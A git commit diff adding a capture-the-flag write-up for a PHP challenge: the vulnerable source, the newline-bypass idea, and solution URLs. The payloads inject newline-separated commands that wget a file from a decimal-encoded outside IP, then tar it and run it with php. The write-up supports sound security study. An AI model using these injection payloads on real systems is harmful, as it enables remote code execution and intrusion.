db2c4ca2a73ebaf5d9a129f8d3df02c83246bd34
milan150278 <48815474+milan150278@users.noreply.github.com>
2019-11-13 21:51:42 +0800

    Update index.php

--- web/babyfirst/index.php
+++ web/babyfirst/index.php
@@ -1,3 +1,11 @@
+Idea:
+
+Use NewLine to bypass regular expression check
+Command injection only with alphanumeric characters
+
+
+Source Code:
+
 <?php
     highlight_file(__FILE__);
 
@@ -11,5 +19,29 @@
         if ( !preg_match('/^\w+$/', $args[$i]) )
             exit();
     }
+
     exec("/bin/orange " . implode(" ", $args));
 ?>
+
+
+Solution:
+
+http://localhost/
+?args[0]=x%0a
+&args[1]=mkdir
+&args[2]=orange%0a
+&args[3]=cd
+&args[4]=orange%0a
+&args[5]=wget
+&args[6]=846465263%0a
+
+http://localhost/
+?args[0]=x%0a
+&args[1]=tar
+&args[2]=cvf
+&args[3]=aa
+&args[4]=orange%0a
+&args[5]=php
+&args[6]=aa
+
+And there are also lots of creative solutions, you can check the write ups below.
